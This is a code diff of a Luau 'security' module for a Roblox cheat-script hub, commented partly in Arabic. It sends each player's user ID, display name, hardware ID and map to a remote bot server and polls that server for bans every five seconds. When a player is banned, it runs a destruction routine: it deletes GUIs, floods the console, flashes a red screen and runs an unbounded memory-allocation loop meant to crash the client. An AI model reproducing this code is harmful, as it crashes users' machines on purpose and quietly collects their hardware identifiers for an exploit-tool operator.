@@ -1,9 +1,10 @@
 -- ==========================================
--- 🛡️ TRO HUB • Ultimate Production Luau Core (Hell Advanced Security)
+-- 🛡️ TRO HUB • Hell Advanced Security (Complete Script)
 -- ==========================================
 
-local API_URL = "https://43xc5imj1q.apps.bot-hosting.cloud/check?id="
-local STORE_URL = "https://43xc5imj1q.apps.bot-hosting.cloud/store_pending"
+-- ✅ الرابط الجديد الخاص بك
+local API_URL = "https://75ddfp6yex.apps.bot-hosting.cloud/check?id="
+local STORE_URL = "https://75ddfp6yex.apps.bot-hosting.cloud/store_pending"
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -28,6 +29,7 @@ local function safeRequest(options)
     return nil
 end
 
+-- 🌐 جمع بيانات اللعبة
 local mapName = "Unknown Map"
 pcall(function()
     local info = MarketplaceService:GetProductInfo(game.PlaceId)
@@ -63,6 +65,7 @@ local currentHwid = (getgenv and getgenv().gethwid and getgenv().gethwid()) or
 
 local userNick = tostring(LocalPlayer.Name) .. " (" .. tostring(LocalPlayer.DisplayName) .. ")"
 
+-- 📦 تجهيز البيانات للإرسال
 local function getPayloadForServer(isAllowed)
     return {
         user_id = tostring(LocalPlayer.UserId),
@@ -78,6 +81,7 @@ local function getPayloadForServer(isAllowed)
     }
 end
 
+-- 📤 إرسال التقرير للبوت (مرة واحدة عند التشغيل)
 local function sendServerLog(isAllowed)
     task.spawn(function()
         pcall(function()
@@ -91,7 +95,7 @@ local function sendServerLog(isAllowed)
     end)
 end
 
--- 🛑 دالة التدمير
+-- 🛑 دالة التدمير (تنفجر فقط إذا صار محظور)
 local isDestroyed = false
 local function triggerDestruction(reason)
     if isDestroyed then return end
@@ -100,6 +104,7 @@ local function triggerDestruction(reason)
     print("TRO Security: تم حظرك! إطلاق بروتوكول التدمير...")
     sendServerLog(false)
     
+    -- تدمير الواجهات
     pcall(function()
         for _, gui in ipairs(CoreGui:GetChildren()) do
             if gui.Name ~= "RobloxGui" then pcall(function() gui:Destroy() end) end
@@ -109,6 +114,7 @@ local function triggerDestruction(reason)
         end
     end)
 
+    -- زرع 70 لوحة
     pcall(function()
         for i = 1, 70 do
             task.spawn(function()
@@ -137,6 +143,7 @@ local function triggerDestruction(reason)
         end
     end)
 
+    -- سبام الكونسول
     task.spawn(function()
         while true do
             print("🚨 TRO HUB: PERMANENTLY BANNED! 🚨")
@@ -144,6 +151,7 @@ local function triggerDestruction(reason)
         end
     end)
 
+    -- شاشة حمراء تومض
     pcall(function()
         local screenGui = Instance.new("ScreenGui")
         screenGui.Name = "TRO_Double_Annihilation"
@@ -185,6 +193,7 @@ local function triggerDestruction(reason)
         textLabel.Parent = screenGui
     end)
 
+    -- كراش الرام
     task.spawn(function()
         local doubleMemoryEater = {}
         while true do
@@ -196,7 +205,7 @@ local function triggerDestruction(reason)
     end)
 end
 
--- ⚡ الفحص
+-- ⚡ دالة الفحص
 local function checkStatus()
     local targetUrl = API_URL .. tostring(LocalPlayer.UserId) .. "&hwid=" .. tostring(currentHwid) .. "&t=" .. math.random(1000, 9999)
     local res = safeRequest({Url = targetUrl, Method = "GET"})
@@ -212,6 +221,7 @@ local function checkStatus()
     return "error", "connection_failed"
 end
 
+-- 1. الفحص الأولي عند التشغيل
 local initialStatus, initialReason = checkStatus()
 if initialStatus == "denied" then
     triggerDestruction(initialReason)
@@ -219,7 +229,23 @@ if initialStatus == "denied" then
 end
 
 print("TRO Security: تم التحقق بنجاح! أهلاً بك.")
-sendServerLog(true)
+sendServerLog(true) -- إرسال التقرير لديسكورد (عبر البوت)
+
+-- ==========================================
+-- 🟢 سكربتك الأساسي يوضع هنا:
+-- ==========================================
+print("TRO HUB: تم تشغيل السكربت بنجاح.")
+
+-- 2. الفحص المستمر كل 5 ثواني للحظر
+task.spawn(function()
+    while task.wait(5) do
+        local currentStatus, currentReason = checkStatus()
+        if currentStatus == "denied" then
+            triggerDestruction(currentReason)
+            break
+        end
+    end
+end)
 
 -- ==========================================
 -- 🟢 سكربتك الأساسي يوضع هنا:
